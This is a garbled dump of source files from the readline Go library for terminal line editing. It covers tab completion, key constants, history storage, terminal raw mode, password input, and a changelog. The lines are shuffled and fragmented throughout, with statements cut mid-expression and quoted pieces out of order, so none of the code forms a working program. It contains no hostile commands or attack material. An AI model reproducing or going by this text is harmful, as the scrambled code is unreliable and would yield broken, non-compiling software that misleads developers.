"newLine[idx] = append(newLine[idx], ' ')"
"//   DoTree([a, ], 0) [a1, a2]"
package readline
// b
"func RetSegment(segments [][]rune, cands [][]rune, idx int) ([][]rune, int) {"
"segment, idx := SplitSegment(line, pos)"
"dumpSegmentCompleter) DoSegment(segment [][]rune, n int) [][]rune {"
"//   DoTree([], 0) [a, b]"
} else {
"segs = append(segs, line[lastIdx"
func (d 
for idx := range newLine {
pos = 0
- a1
func SegmentAutoComplete(completer SegmentCompleter) 
SegmentCompleter
"ret := make([][]rune, 0, len(cands))"
1:idx])
"return newLine, offset"
dumpSegmentCompleter{f}}
line = line[:pos]
return 
"return ret, idx"
inSelectMode    bool
o.op.buf.WriteRunes(o.candidate[0])
lines := 1
= o.candidateColNum
 o.candidateChoise
if colNum != 0 {
return line 
line
"n""), lineCnt))"
o.candidateChoise = o.candidateChoise % len(o.candidate)
 colNum)) / colNum
buf.WriteRunes(newLines[0])
opCompleter) IsInCompleteSelectMode() bool {
buf.WriteRunes(same)
default:
num := o.candidateColNum - o.candidateChoise%o.candidateColNum - 1
"opCompleter) EnterCompleteMode(offset int, candidate [][]rune) {"
o.inSelectMode = false
"case CharBell, CharInterrupt:"
"""bytes"""
func (t 
w := runes.WidthAll(c)
opCompleter) aggCandidate(candidate [][]rune) int {
o.candidateChoise = -1
opCompleter) nextCandidate(i int) {
 o.candidateColNum
case CharPrev:
"47m"")"
o.candidateChoise = len(o.candidate) - 1
o.op.buf.WriteRunes(o.op.candidate[o.op.candidateChoise])
= (width - (colWidth 
o.ExitCompleteMode(true)
"033[J"")"
o.nextCandidate(-num)
"Do(line []rune, pos int) (newLine [][]rune, length int)"
"op:    op,"
inSelect := idx == o.candidateChoise 
"buf.WriteString("""
 i < len(candidate[0])
rs := buf.Runes()
o.CompleteRefresh()
colIdx := 0
"func newOpCompleter(w io.Writer, op "
"same, size := runes.Aggregate(newLines)"
"// Completer need to pass all the candidates, and how long they shared the same characters in line"
if tmpChoise >= o.getMatrixSize() {
lineCnt := o.op.buf.CursorLineCount()
o.candidateSource = rs
if w > colWidth {
o.candidate = candidate
opCompleter) HandleCompleteSelect(r rune) bool {
opCompleter) doSelect() {
next = false
if colIdx == colNum {
} else if tmpChoise >= len(o.candidate) {
// only Aggregate candidates in non-complete mode
o.candidate = nil
o.candidateChoise = len(o.candidate) 
lines
o.ExitCompleteSelectMode()
line := len(o.candidate) / o.candidateColNum
"return [][]rune{[]rune("""
if next {
// -1 to avoid reach the end of line
colIdx
if o.IsInCompleteSelectMode() {
o.inCompleteMode = true
colIdx = 0
if !o.inCompleteMode {
o.op.buf.PromptLen())
opCompleter) OnWidthChange(newWidth int) {
o.candidateOff = -1
o.nextCandidate(-1)
type AutoCompleter interface {
for j := 0
tmpChoise 
"for _, c := range o.candidate {"
num := o.candidateChoise % o.candidateColNum
if tmpChoise < 0 {
"w:     w,"
opCompleter) CompleteRefresh() {
"width: width,"
candidate       [][]rune
if i > len(candidate[j]) {
buf.WriteString(string(same))
func (o 
"TabCompleter) Do([]rune, int) ([][]rune, int) {"
o.width = newWidth
opCompleter) OnComplete() bool {
if !o.IsInCompleteMode() {
"for idx, c := range o.candidate {"
if o.candidateChoise >= len(o.candidate) {
033[%dA
return true
opCompleter) ExitCompleteSelectMode() {
// Readline will pass the whole line and current offset to it
if size > 0 {
aggregate:
type opCompleter struct {
o.inSelectMode = true
"case CharEnter, CharCtrlJ:"
"""fmt"""
"033[%dC"", o.op.buf.idx"
"newLines, offset := o.op.cfg.AutoComplete.Do(rs, buf.idx)"
o.inCompleteMode = false
import (
colWidth = w
"o.EnterCompleteMode(offset, newLines)"
"t"")}, 0"
Operation
"//   Do(""git"", 3) => ["""", ""-shell""], 3"
if o.candidateChoise < 0 {
o.EnterCompleteSelectMode()
case CharNext:
type TabCompleter struct{}
return o.inSelectMode
w     io.Writer
"Operation, width int) "
opCompleter) ExitCompleteMode(revent bool) {
lines)
opCompleter) IsInCompleteMode() bool {
tmpChoise := o.candidateChoise - o.candidateColNum
if candidate[j][i] != candidate[j
for i := 0
if len(newLines) == 1 {
same := o.op.buf.RuneSlice(-o.candidateOff)
offset := 0
// move back
package readline
candidateSource []rune
1][i] {
buf.Flush()
= num
"//   Do(""g"", 1) => [""o"", ""it"", ""it-shell"", ""rep""], 1"
o.nextCandidate(1)
if o.width == 0 {
colNum := width / colWidth
opCompleter) EnterCompleteSelectMode() {
// Example:
o.candidateChoise 
if len(o.candidate)%o.candidateColNum != 0 {
tmpChoise -= o.getMatrixSize()
tmpChoise := o.candidateChoise 
"fmt.Fprintf(buf, """
opCompleter {
if o.IsInCompleteMode() 
if inSelect {
if len(o.candidate) == 1 {
return 
return o.inCompleteMode
opCompleter) getMatrixSize() int {
= o.candidateOff 
next := true
buf.WriteString(string(c))
goto aggregate
case CharBackward:
"033[0m"")"
width int
opCompleter{
"buf.Write(bytes.Repeat([]byte("""
buf := bufio.NewWriter(o.w)
offset = i
"buf.Write(bytes.Repeat([]byte("" ""), colWidth-runes.WidthAll(c)-runes.WidthAll(same)))"
if len(newLines) == 0 {
case CharLineEnd:
switch r {
buf := o.op.buf
tmpChoise -= o.candidateColNum
 o.IsInCompleteSelectMode()
return false
inCompleteMode  bool
o.candidateSource = nil
"""io"""
o.doSelect()
 o.candidateSource != nil 
"r"", lineCnt-1"
"""bufio"""
o.candidateChoise = tmpChoise
o.candidateOff = offset
op    
"//   Do(""gi"", 2) => [""t"", ""t-shell""], 2"
o.ExitCompleteMode(false)
"case CharTab, CharForward:"
= o.getMatrixSize()
case CharBackspace:
return
if tmpChoise >= len(o.candidate) {
colWidth := 0
" runes.Equal(rs, o.candidateSource) {"
case CharLineStart:
colWidth 
033[30
candidateChoise int
candidateColNum int
width := o.width - 1
o.candidateColNum = colNum
candidateOff    int
"//   [go, git, git-shell, grep]"
return offset
 j < len(candidate)-1
State) error {
"for _, r := range rs {"
RawMode) Enter() (err error) {
CharCtrlW     = 23
ticker.Stop()
// calculate how many lines for N character
go func() {
func debugList(l 
MetaBackward rune = -iota - 1
"escapeKeyPair) Get2() (int, int, bool) {"
attr string
// translate EscX to Meta
t = now
"""container/list"""
default:
"""os"""
r = MetaTranspose
typ  rune
CharBackward  = 2
if r == '
t := time.Now()
case 'C':
// print a linked list to Debug()
list.List) {
ticker := time.NewTicker(10 
return nil
state 
// -----------------------------------------------------------------------------
"""bytes"""
CharCtrlY     = 25
"func GetInt(s []string, def int) int {"
case i >= '0' 
CharCtrlH     = 8
var r rune
"os.O_APPEND, 0666)"
 key <= 0xdbff
CharNext      = 14
case i >= 'A' 
case 'B':
r = MetaBackward
"""strconv"""
CharBell      = 7
MetaBackspace
buf.Reset()
currentWidth = 0
"""unicode"""
w := runes.Width(r)
case 'H':
"""strings"""
r = CharLineEnd
Debug(n)
CharFwdSearch = 19
time.Sleep(2000 
case 'O':
if r.state == nil {
escapeKeyPair {
bufio.Reader) rune {
return key >= 32 
case 'D':
CharEsc       = 27
CharForward   = 6
CharBckSearch = 18
if len(s) == 0 {
var ret []string
ch := make(chan struct{})
r = CharBackward
func sleep(n int) {
for e := l.Front()
wg.Add(1)
// append log info to another file
p := escapeKeyPair{}
CharTranspose = 20
buf := bytes.NewBuffer(nil)
"if err.Error() == ""errno 0"" {"
wg.Wait()
r = CharNext
for {
"return s1, s2, true"
func Debug(o ...interface{}) {
func IsPrintable(key rune) bool {
return err
buf.WriteRune(r)
} else {
// WaitForResume need to call before current process got suspend.
now := <-ticker.C
r = CharDelete
r = MetaDelete
CharPrev      = 16
isInSurrogateArea := key >= 0xd800 
return c
"func LineCount(screenWidth, w int) int {"
r = CharPrev
break
p.attr = buf.String()
if err != nil {
return true
case i >= 'a' 
type RawMode struct {
"err := restoreTerm(fd, state)"
 !isInSurrogateArea
"c, err := strconv.Atoi(s[0])"
bufio.Reader) 
"""fmt"""
isWindows = false
p.typ = r
reader.UnreadRune()
import (
var wg sync.WaitGroup
r = MetaBackspace
"sp := strings.Split(e.attr, """
"Debug(idx, fmt.Sprintf(""%"
 i <= '9':
"fmt.Fprintln(f, o...)"
 e != nil
if len(sp) < 2 {
switch d {
CharTab       = 9
type escapeKeyPair struct {
"func Restore(fd int, state "
func IsWordBreak(i rune) bool {
r = CharForward
// errno 0 means everything is ok :)
 i <= 'Z':
CharKill      = 11
 time.Millisecond)
} else if unicode.IsNumber(r) {
package readline
case CharEsc:
case '
CharCtrlZ     = 26
"v"", e.Value))"
MetaDelete
return def
return r
"func readEscKey(r rune, reader "
CharDelete    = 4
func WaitForResume() chan struct{} {
ch <- struct{}{}
switch key.typ {
"return Restore(GetStdin(), r.state)"
"r.state, err = MakeRaw(GetStdin())"
time.Millisecond {
"f, _ := os.OpenFile(""debug.tmp"", os.O_RDWR"
CharCtrlJ     = 10
 i <= 'z':
"""time"""
if currentWidth >= screenWidth {
CharInterrupt = 3
CharLineStart = 1
return 
 e = e.Next() {
switch {
CharLineEnd   = 5
return ch
func escapeExKey(key 
CharCtrlL     = 12
case 'F':
// translate Esc[X
"return -1, -1, false"
return ret
CharEscapeEx  = 91
"func escapeKey(r rune, reader "
r = CharLineStart
MetaTranspose
case 'b':
r = MetaForward
switch r {
"r, _, _ = reader.ReadRune()"
"ret = append(ret, buf.String())"
if now.Sub(t) > 100
case 'd':
func (e 
CharCtrlU     = 21
MetaForward
return false
"s2, err := strconv.Atoi(sp[1])"
currentWidth := start
// which means this process is resumed.
CharEnter     = 13
wg.Done()
"d, _, _ := reader.ReadRune()"
if w%screenWidth != 0 {
"""bufio"""
"""sync"""
"func SplitByLine(start, screenWidth int, rs []rune) []string {"
func (r 
case CharTranspose:
State
case CharBackspace:
"// It will run a ticker until a long duration is occurs,"
"if key.attr == ""3"" {"
RawMode) Exit() error {
os.O_CREATE
currentWidth 
case 'A':
"s1, err := strconv.Atoi(sp[0])"
r := w / screenWidth
idx := 0
var (
f.Close()
case 'f':
CharBackspace = 127
const (
escapeKeyPair) rune {
  - GOOS=darwin go install github.com/chzyer/readline/example/...
script:
  - go test -race -v
language: go
  - GOOS=windows go install github.com/chzyer/readline/example/...
  - GOOS=linux go install github.com/chzyer/readline/example/...
  - 1.x
return int(syscall.Stdin)
func DefaultIsTerminal() bool {
import (
"info, _ := GetConsoleScreenBufferInfo()"
"""syscall"""
return SetConsoleCursorPosition(
"_COORD{0, 0})"
func ClearScreen(_ io.Writer) error {
return int(info.dwSize.x)
isWindows = true
"""io"""
build windows
package readline
// get width of the terminal
if info == nil {
func GetStdin() int {
return -1
func init() {
func GetScreenWidth() int {
func SuspendMe() {
func DefaultOnWidthChanged(func()) {
// ClearScreen clears the console screen
return true
Config) (o 
// just report the error
Config
o.enable = true
"opHistory) FindFwd(isNewSearch bool, rs []rune, start int) (int, "
o.Push([]rune(line))
return o
Tmp     []rune
for item := o.history.Front()
// only called by newOpHistory
for 
"""container/list"""
 elem != nil
"""os"""
opHistory{
o.fd = f
item = item[start:]
Source  []rune
"if o.cfg.HistoryFile == """" {"
return nil
opHistory) Enable() {
"return nil, false"
if len(line) == 0 {
if o.current != nil {
"os.O_APPEND, 0666)"
opHistory) Push(s []rune) {
h.Tmp = nil
opHistory) Close() {
item = item[:start]
if idx < 0 {
 item != nil
"return idx, elem"
"cfg:     cfg,"
defer o.fdLock.Unlock()
os.O_WRONLY
r := bufio.NewReader(o.fd)
currentItem := o.current.Value.(
return runes.Copy(o.showItem(current.Value))
// set current to last item
line = strings.TrimSpace(line)
current = runes.Copy(current)
r.Source = s
"""strings"""
o = 
cfg        
fd.Close()
o.Push(nil)
o.historyUpdatePath(o.cfg.HistoryFile)
"if runes.Equal(current, prev.Value.("
current := o.current.Next()
o.history.Remove(o.history.Front())
hisItem).Source) 
hisItem{Source: s})
opHistory) initHistory() {
opHistory) Revert() {
total := 0
s = runes.Copy(s)
opHistory) historyUpdatePath(path string) {
opHistory) Disable() {
"_, err = o.fd.Write([]byte(string(r.Source) "
(uintptr(0))
o.current = o.history.Back()
opHistory) debug() {
// Enable the current history
for o.history.Len() > o.cfg.HistoryLimit 
// push a new one to commit current command
prev := back.Prev()
hisItem) Clean() {
= start
 elem = elem.Next() {
" "".tmp"""
start = 0
if current == nil {
if !o.enable {
current := o.current.Prev()
start -= len(rs)
// move history item to current command
item := o.showItem(elem.Value)
type opHistory struct {
continue
opHistory) Init() {
"// fd is write only, just satisfy what we need."
if item.Version == o.historyVer {
 err != nil {
o.enable = false
// if just use last command without modify
hisItem).Clean()
o.rewriteLocked()
} else {
os.O_TRUNC
list.Element
func (o 
// just clean lastest history
history    
"Debug(fmt.Sprintf(""%"
if prev != nil {
if o.current != o.history.Back() {
break
"opHistory) FindBck(isNewSearch bool, rs []rune, start int) (int, "
return item.Source
if err != nil {
// replace history file
return o.fd.Fd() == 
tmpFile := o.cfg.HistoryFile 
"line, err := r.ReadString('"
"Debug(""-------"")"
"fd, err := os.OpenFile(tmpFile, os.O_CREATE"
for elem := o.history.Front()
"""fmt"""
type hisItem struct {
h.Source = nil
opHistory) IsHistoryClosed() bool {
o.fd = fd
import (
= len(rs)
"// err only can be a IO error, just report"
 item = item.Next() {
"return runes.Copy(o.showItem(current.Value)), true"
"if o.cfg.HistoryFile != """" {"
current = runes.Copy(currentItem.Tmp)
if len(current) == 0 {
elem := o.history.PushBack(
if back := o.history.Back()
if elem == o.current {
"opHistory) Next() ([]rune, bool) {"
func newOpHistory(cfg 
if isNewSearch {
o.current = current
"n""))"
if len(item) >= start {
 back != nil {
 total
current    
opHistory) rewriteLocked() {
o.current.Value = r
package readline
// save history
buf.Flush()
item := obj.(
func (h 
o.historyVer
o.initHistory()
idx 
// ignore the empty line
"if err = os.Rename(tmpFile, o.cfg.HistoryFile)"
return item.Tmp
opHistory) Rewrite() {
enable     bool
"os.O_RDWR, 0666)"
opHistory) New(current []rune) (err error) {
hisItem).Source) {
r := o.current.Value.(
r.Version = o.historyVer
fd         
"enable:  true,"
"err = o.Update(current, true)"
buf := bufio.NewWriter(fd)
if len(item)-1 >= start {
if o.fd != nil {
"idx := runes.IndexAllBckEx(item, rs, o.cfg.HistorySearchFold)"
buf.WriteString(string(elem.Value.(
list.List
 o.history.Len() > 0 {
list.Element) {
o.current.Value.(
o.Push(s)
o.current = nil
if total > o.cfg.HistoryLimit {
if commit {
"f, err := os.OpenFile(path, os.O_APPEND"
historyVer int64
"opHistory) Update(s []rune, commit bool) (err error) {"
if o.current == nil {
"history: list.New(),"
"return -1, nil"
for elem := o.current
if o.IsHistoryClosed() {
o.current = elem
Version int64
start 
o.fd.Close()
opHistory) Prev() []rune {
opHistory) Compact() {
opHistory) {
 elem = elem.Prev() {
o.Compact()
os.File
opHistory) Reset() {
fdLock     sync.Mutex
o.history = list.New()
"""bufio"""
"""sync"""
o.fdLock.Lock()
// history deactivated
"idx := runes.IndexAllEx(item, rs, o.cfg.HistorySearchFold)"
"r.Tmp = append(r.Tmp[:0], s...)"
return
os.O_CREATE
hisItem)
"v"", item.Value))"
// Disable the current history
opHistory) showItem(obj interface{}) []rune {
if start < 0 {
 o.IsSearchMode() {
// ignore IO error
Operation) SaveHistory(content string) error {
"cfg.opSearch = newOpSearch(op.buf.w, op.buf, op.history, cfg, width)"
o.buf.MoveToPrevWord()
cfg     
Line []rune
case CharBell:
default:
Operation) Stderr() io.Writer {
o.m.Lock()
func NewOperation(t 
cfg := o.GenPasswordConfig()
if err := cfg.Init()
case CharPrev:
if o.GetConfig().FuncFilterInputRune != nil {
if !o.GetConfig().UniqueEditLine {
 !o.IsNormalMode() {
w       io.Writer
"Config) ([]byte, error) {"
"""errors"""
buf := o.history.Prev()
if o.history != nil {
_ = o.history.New(data)
if cfg.opHistory == nil {
isUpdateHistory := true
if !o.SearchMode(S_DIR_BCK) {
"return op.cfg, nil"
var data []rune
"wrapWriter{target: o.GetConfig().Stdout, r: o, t: o.t}"
o.outchan <- data
o.buf.WriteRune('
for {
case MetaDelete:
"Operation) PasswordEx(prompt string, l Listener) ([]byte, error) {"
} else {
func (o 
break
"case MetaBackspace, CharCtrlW:"
Operation) SetHistoryPath(path string) {
"return op.cfg, err"
go op.ioloop()
"case CharEnter, CharCtrlJ:"
"return e.Line, ErrInterrupt"
w.r.CompleteRefresh()
o.buf.BackEscapeWord()
"return ""Interrupted"""
op.SetConfig(cfg)
case CharNext:
return w.target.Write(b)
old := op.cfg
"// if stdin got io.EOF and there is something left in buffer,"
o.errchan <- io.EOF
Operation) SetTitle(t string) {
o.buf.MoveBackward()
op.buf.SetConfig(cfg)
// treat as EOF
o.buf.Kill()
cfg.opHistory = op.history
r = CharEnter
package readline
o.buf.WriteString(o.GetConfig().EOFPrompt 
remain = remain[:len(remain)-len([]rune(hint))]
case CharBckSearch:
history 
"listener.OnChange(nil, 0, 0)"
op.history = cfg.opHistory
case CharDelete:
keepInCompleteMode = o.HandleCompleteSelect(r)
fallthrough
t      
"return nil, err"
Operation) PasswordWithConfig(cfg 
Config) 
Operation) SetMaskRune(r rune) {
"r, process = o.GetConfig().FuncFilterInputRune(r)"
Operation) GenPasswordConfig() 
case CharBackward:
Operation) Stdout() io.Writer {
opHistory
func (p 
"""io"""
ClearScreen(o.w)
"Operation) Runes() ([]rune, error) {"
o.ExitCompleteMode(false)
o.history = newOpHistory(o.cfg)
cfg.Prompt = prompt
"Operation) Password(prompt string) ([]byte, error) {"
var (
o.history.Revert()
case CharKill:
Config) (
n   int
if r == 0 {
"t:       t,"
op.opSearch.OnWidthChange(newWidth)
w.r.buf.Refresh(func() {
case CharForward:
InitHistory()
op.opSearch = cfg.opSearch
 !o.IsSearchMode()
o.buf.MoveForward()
o.t.SleepToResume()
err error
"007""))"
defer op.m.Unlock()
case CharCtrlZ:
o.buf.WriteString(hint)
DumpListener{f: f}
if o.GetConfig().UniqueEditLine {
"errchan: make(chan error, 1),"
"return o.PasswordEx(prompt, nil)"
op.w = op.buf.w
o.buf.MoveToNextWord()
 !o.IsSearchMode() {
opPassword
// other things goes fine.
t       
Operation) SetPrompt(s string) {
keepInCompleteMode := false
if err := o.opPassword.EnterPasswordMode(cfg)
o.errchan <- 
if listener != nil {
op.opPassword = newOpPassword(op)
if err != nil {
o.buf.Yank()
"op.opCompleter = newOpCompleter(op.buf.w, op, width)"
"func FuncListener(f func(line []rune, pos int, key rune) (newLine []rune, newPos int, ok bool)) Listener {"
newWidth := cfg.FuncGetWidth()
Operation
select {
return op
"DumpListener) OnChange(line []rune, pos int, key rune) (newLine []rune, newPos int, ok bool) {"
"return []byte(string(r)), nil"
func (d 
outchan chan []rune
opCompleter
return 
if op.cfg.AutoComplete != nil {
defer o.opPassword.ExitPasswordMode()
Operation {
"if e, ok := err.("
o.buf.SetMask(r)
o.buf.Reset()
data = o.buf.Reset()
keepInSearchMode = true
Operation) IsNormalMode() bool {
InterruptError{remain}
return o.opPassword.PasswordConfig()
keepInCompleteMode = true
"o.w.Write([]byte("""
data = data[:len(data)-1] // trim 
func (
width := op.cfg.FuncGetWidth()
Operation) Refresh() {
o.buf.Transpose()
Operation) ioloop() {
op.m.Lock()
if !o.SearchMode(S_DIR_FWD) {
"n, err = w.target.Write(b)"
if o.buf.Len() > 0 
opVim
op.opVim = newVimMode(op)
m       sync.Mutex
o.buf.WriteRune(r)
if o.IsInCompleteMode() {
"wrapWriter{target: o.GetConfig().Stderr, r: o, t: o.t}"
buf     
if !keepInSearchMode 
o.buf.Backspace()
case r := <-o.outchan:
o.ExitSearchMode(true)
Operation) ResetHistory() {
if !o.buf.Delete() {
type InterruptError struct {
op.buf.OnWidthChange(newWidth)
"// if err is not nil, it just mean it fail to write to file"
if o.t.IsReading() {
op.SetPrompt(cfg.Prompt)
isUpdateHistory = false
"ErrInterrupt = errors.New(""Interrupt"")"
o.SearchBackspace()
case err := <-o.errchan:
return !o.IsInCompleteMode() 
if o.IsInCompleteSelectMode() {
Operation) SetBuffer(what string) {
o.cfg
o.buf.MoveToLineEnd()
type Listener interface {
op := 
 err != nil {
o.Refresh()
type wrapWriter struct {
"return r, nil"
op.cfg.FuncOnWidthChanged(func() {
"buf:     NewRuneBuffer(t, cfg.Prompt, cfg, width),"
InterruptError)
type defaultPainter struct{}
case MetaBackward:
if o.GetConfig().AutoComplete == nil {
if r == 0 { // io.EOF
o.buf.DeleteWord()
// it will cause null history
if !o.GetConfig().DisableAutoSaveHistory {
case CharCtrlL:
Operation) GetConfig() 
if isUpdateHistory 
type DumpListener struct {
remain := o.buf.Reset()
"o.buf.SetWithIdx(newPos, newLine)"
o.buf.Set([]rune(what))
case CharCtrlY:
o.ExitSearchMode(false)
o.buf.SetPrompt(s)
"Config, error) {"
Config {
width := cfg.FuncGetWidth()
// SetHistoryPath will close opHistory which already exists
switch r {
"OnChange(line []rune, pos int, key rune) (newLine []rune, newPos int, ok bool)"
o.m.Unlock()
o.buf.Set(buf)
"newLine, newPos, ok := listener.OnChange(o.buf.Runes(), o.buf.Pos(), r)"
r      
"return n, err"
if o.IsSearchMode() {
if w.r.IsInCompleteMode() {
"""sync"""
o.buf.Refresh(nil)
Operation) Close() {
return o.history.New([]rune(content))
"// so if we use it next time, we need to reopen it by "
"o.history.Update(o.buf.Runes(), false)"
if w.r.IsSearchMode() {
cfg := 
o.OnComplete()
o.SearchChar(r)
"Operation) String() (string, error) {"
Config
o.buf.Refresh(nil) // to refresh the line
w.r.SearchRefresh(-1)
} else if o.IsInCompleteMode() {
case CharFwdSearch:
cfg.Listener = l
op.SetHistoryPath(cfg.HistoryFile)
op.SetMaskRune(cfg.MaskRune)
if buf != nil {
"f func(line []rune, pos int, key rune) (newLine []rune, newPos int, ok bool)"
if !process {
o.buf.KillFront()
case CharInterrupt:
RuneBuffer
o.history.Reset()
o.ExitCompleteMode(true)
"return string(r), err"
func (w 
hint := o.GetConfig().InterruptPrompt 
type Operation struct {
o.t.KickRead()
o.t.EnterRawMode()
o.CompleteRefresh()
"wrapWriter) Write(b []byte) (int, error) {"
op.history.Init()
op.cfg = cfg
defer o.t.ExitRawMode()
type Painter interface {
case CharTab:
if keepInCompleteMode {
target io.Writer
var process bool
continue
return line
o.buf.Refresh(nil) // print prompt
"defaultPainter) Paint(line []rune, _ int) []rune {"
"r = o.HandleVim(r, o.t.ReadRune)"
o.t.Bell()
Terminal
r := o.t.ReadRune()
if op.cfg == cfg {
InterruptError) Error() string {
return o.PasswordWithConfig(cfg)
if o.IsEnableVimMode() {
 ok {
"Paint(line []rune, pos int) []rune"
o.buf.Clean()
import (
errchan chan error
Operation) Clean() {
op.opCompleter.OnWidthChange(newWidth)
// let's flush them by sending CharEnter.
if ok {
033[2
opSearch
return o.Slice()
if o.buf.Len() == 0 {
o.buf.MoveToLineStart()
listener := o.GetConfig().Listener
if !w.t.IsReading() {
case MetaForward:
if !keepInCompleteMode {
keepInSearchMode := false
Operation) SetConfig(cfg 
case CharCtrlU:
"buf, ok := o.history.Next()"
// And we will got io.EOF int next loop.
Operation{
"outchan: make(chan []rune),"
o.history.Close()
func (op 
"return d.f(line, pos, key)"
case CharLineEnd:
"Terminal, cfg "
o.cfg.HistoryFile = path
"r, err := o.Runes()"
"case CharBackspace, CharCtrlH:"
case CharTranspose:
case o.errchan <- io.EOF:
"Operation) Slice() ([]byte, error) {"
case CharLineStart:
if o.OnComplete() {
"return old, nil"
continue           // ignore this rune
42][42] improve multiple lines compatibility
 instead of 
[60]: https://github.com/chzyer/readline/pull/60
UniqueEditLine
[42]: https://github.com/chzyer/readline/pull/42
<Home>
Config
 Bugs fixed for 
 in empty line will cause 
 to 
 Only enter raw mode as needed (calling 
43][43] remove sub-package(runes) for gopkg compatibility
readline
support suspend process (ctrl
60][60] Support dynamic autocompletion
 Add a demo for multiline [example/readline-multiline](https://github.com/chzyer/readline/blob/master/example/readline-multiline/readline-multiline.go) which can submit one SQL by multiple lines.
 1.1 - 2015-11-20
", this will privodes a shell-like user experience."
[33]: https://github.com/chzyer/readline/pull/33
ErrInterrupt
[38]: https://github.com/chzyer/readline/pull/38
[28]: https://github.com/chzyer/readline/pull/28
[43]: https://github.com/chzyer/readline/pull/43
12][12] Add support for key 
io.EOF
 Supports performs even stdin/stdout is not a tty.
" Remove dependent package ""golang.org/x/crypto/ssh/terminal"""
49][49] fix bug that check equals with previous command
" Add a new simple apis for single instance, check by [here](https://github.com/chzyer/readline/blob/master/std.go). It need to save history manually if using this api."
r (replace character)
C) if not interact with 
<End>
 Customable Interrupt/EOF prompt in 
[46]: https://github.com/chzyer/readline/pull/46
[27]: https://github.com/chzyer/readline/pull/27
 Fix ANSI parser on Windows
"33][33], vim mode now support "
Ctrl
 Provides a new password user experience(
 Initial public release.
PrefixCompleter
 1.3 - 2016-05-09
"23][23], support stdin remapping"
"28][28], fixes the history is not working as expected."
x (delete character)
 Fix wrong column width in complete mode on Windows
 ChangeLog
48][48]
"27][27], add a "
 in anytime will cause 
46][46] Auto complete with space prefixed line
 1.4 - 2016-07-25
Readline()
[49]: https://github.com/chzyer/readline/pull/49
17][17] Change atomic package to use 32bit function to let it runnable on arm 32bit devices
", which will erase the editing line after user submited it, usually use in IM."
[12]: https://github.com/chzyer/readline/pull/12
" Add a demo for checking password strength [example/readline-pass-strength](https://github.com/chzyer/readline/blob/master/example/readline-pass-strength/readline-pass-strength.go), , written by [@sahib](https://github.com/sahib)"
[17]: https://github.com/chzyer/readline/pull/17
[48]: https://github.com/chzyer/readline/pull/48
<Delete>
"), program will receive signal(e.g. Ctrl"
" in error, Press "
readline.ReadPasswordEx()
[23]: https://github.com/chzyer/readline/pull/23
 1.0 - 2015-10-14
38][38] add SetChildren for prefix completer interface
[53]: https://github.com/chzyer/readline/pull/53
 Press 
53][53] Fix bug which causes integer divide by zero panicking when input buffer is empty
 1.2 - 2016-03-05
"return nil, err"
import (
func getTermios(fd int) (
"// These constants are declared here, rather than importing"
"""syscall"""
if err != 0 {
Termios) error {
// Copyright 2013 The Go Authors. All rights reserved.
const ioctlReadTermios = 0x5401  // syscall.TCGETS
"// on linux, for example gccgo, do not declare them."
return nil
"_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), ioctlWriteTermios, uintptr(unsafe.Pointer(termios)), 0, 0, 0)"
// Use of this source code is governed by a BSD-style
package readline
// license that can be found in the LICENSE file.
return err
const ioctlWriteTermios = 0x5402 // syscall.TCSETS
"func setTermios(fd int, termios "
"// them from the syscall package as some syscall packages, even"
"return termios, nil"
"""unsafe"""
termios := new(Termios)
"_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), ioctlReadTermios, uintptr(unsafe.Pointer(termios)), 0, 0, 0)"
"Termios, error) {"
func DefaultIsTerminal() bool {
"""os/signal"""
import (
func DefaultOnWidthChanged(f func()) {
widthChangeCallback = f
"return w.Write([]byte("""
go func() {
func getWidth(stdoutFd int) int {
return cols
return syscall.Stdin
Xpixel uint16
"""syscall"""
"// SuspendMe use to send suspend signal to myself, when we in the raw mode."
w := getWidth(syscall.Stdout)
if w < 0 {
Ypixel uint16
"""os"""
p.Signal(syscall.SIGTSTP)
widthChangeCallback()
return IsTerminal(syscall.Stdin) 
"build darwin dragonfly freebsd linux,!appengine netbsd openbsd solaris"
"p, _ = os.FindProcess(os.Getpid())"
"cols, _, err := GetSize(stdoutFd)"
widthChangeCallback func()
if !ok {
// For OSX it need to send to parent's pid
// -----------------------------------------------------------------------------
"""io"""
"p, _ := os.FindProcess(os.Getppid())"
package readline
// get width of the terminal
 (IsTerminal(syscall.Stdout) 
"""sync"""
for {
func GetStdin() int {
return -1
type winsize struct {
"func ClearScreen(w io.Writer) (int, error) {"
// For Linux it need to send to myself
widthChange         sync.Once
func GetScreenWidth() int {
Row    uint16
func SuspendMe() {
return w
break
Col    uint16
"ch := make(chan os.Signal, 1)"
if err != nil {
// ClearScreen clears the console screen
"033[H""))"
var (
w = getWidth(syscall.Stderr)
"signal.Notify(ch, syscall.SIGWINCH)"
 IsTerminal(syscall.Stderr))
"_, ok := <-ch"
widthChange.Do(func() {
State) error {
newState := oldState.termios
= syscall.OPOST
// This attempts to replicate the behaviour documented for cfmakeraw in
"func ReadPassword(fd int) ([]byte, error) {"
= syscall.ICRNL
"termios, err := getTermios(fd)"
 syscall.IGNCR 
// ReadPassword reads a line of input from a terminal without local echo.  This
newState.Lflag 
// State contains the state of a terminal.
newState := oldState
"return setTermios(fd, "
 syscall.IXON
"State, error) {"
 syscall.BRKINT 
n' {
"oldState, err := terminal.MakeRaw(0)"
oldState.termios = 
"""syscall"""
state.termios)
 syscall.ICRNL 
= syscall.CS8
"oldState, err := getTermios(fd)"
func MakeRaw(fd int) (
// Putting a terminal into raw mode is the most common requirement:
        panic(err)
type State struct {
func IsTerminal(fd int) bool {
 syscall.PARENB
"build darwin dragonfly freebsd linux,!appengine netbsd openbsd solaris"
var ret []byte
 syscall.IEXTEN
"if termios, err := getTermios(fd)"
 err != nil {
"termios}, nil"
for {
// license that can be found in the LICENSE file.
// GetState returns the current state of a terminal which may be useful to
 syscall.ICANON 
} else {
= syscall.ECHO 
if buf[n-1] == '
// restore the terminal after a signal.
func GetState(fd int) (
break
// Copyright 2011 The Go Authors. All rights reserved.
State{termios: 
"if err := setTermios(fd, newState)"
if err != nil {
// the termios(3) manpage.
// MakeRaw put the terminal connected to the given file descriptor into raw
// previous state.
= syscall.IGNBRK 
= syscall.ICANON 
= syscall.CSIZE 
"ret = append(ret, buf[:n]...)"
// Restore restores the terminal connected to the given file descriptor to a
// mode and returns the previous state of the terminal so that it can be
import (
newState.Cflag 
 syscall.ECHONL 
// newState.Oflag 
termios Termios
"setTermios(fd, oldState)"
 syscall.ISIG
"defer terminal.Restore(0, oldState)"
var buf [16]byte
"// Package terminal provides support functions for dealing with terminals, as"
 syscall.ISIG 
defer func() {
